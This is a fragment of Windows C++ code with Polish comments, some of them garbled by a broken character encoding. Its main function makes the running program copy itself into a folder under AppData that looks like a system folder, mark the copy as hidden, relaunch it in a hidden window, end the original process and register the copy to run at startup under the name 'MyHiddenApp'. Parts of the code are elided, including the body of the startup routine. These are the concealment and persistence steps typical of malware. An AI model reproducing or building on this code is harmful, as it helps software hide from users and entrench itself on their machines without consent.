...
bool AddToStartup(const std::wstring& exePath, const std::wstring& name) {
    HKEY hKey;
...
void TrySelfHideAndMove() {
    wchar_t currentPath[MAX_PATH];
    GetModuleFileNameW(nullptr, currentPath, MAX_PATH);

    // Pobierz folder AppData\Roaming
    wchar_t appDataPath[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, appDataPath);

    // Docelowy katalog: %APPDATA%\Microsoft\Windows\MyApp
    std::wstring targetDir = std::wstring(appDataPath) + L"\\Microsoft\\Windows\\MyApp";
    std::wstring targetExe = targetDir + L"\\program.exe";

    // Jeœli ju¿ tam jesteœmy, to dodaj do autostartu i zakoñcz
    if (_wcsicmp(currentPath, targetExe.c_str()) == 0) {
        AddToStartup(targetExe, L"MyHiddenApp");
        return;
    }

    // Tworzenie katalogu (rekurencyjnie)
    CreateDirectoryW((std::wstring(appDataPath) + L"\\Microsoft").c_str(), nullptr);
    CreateDirectoryW((std::wstring(appDataPath) + L"\\Microsoft\\Windows").c_str(), nullptr);
    CreateDirectoryW(targetDir.c_str(), nullptr);

    // Skopiuj siebie
    CopyFileW(currentPath, targetExe.c_str(), FALSE);

    // Ukryj plik (opcjonalnie)
    SetFileAttributesW(targetExe.c_str(), FILE_ATTRIBUTE_HIDDEN);

    // Uruchom now¹ kopiê w tle
    ShellExecuteW(nullptr, L"open", targetExe.c_str(), nullptr, nullptr, SW_HIDE);

    // Zakoñcz star¹ instancjê
    ExitProcess(0);
}
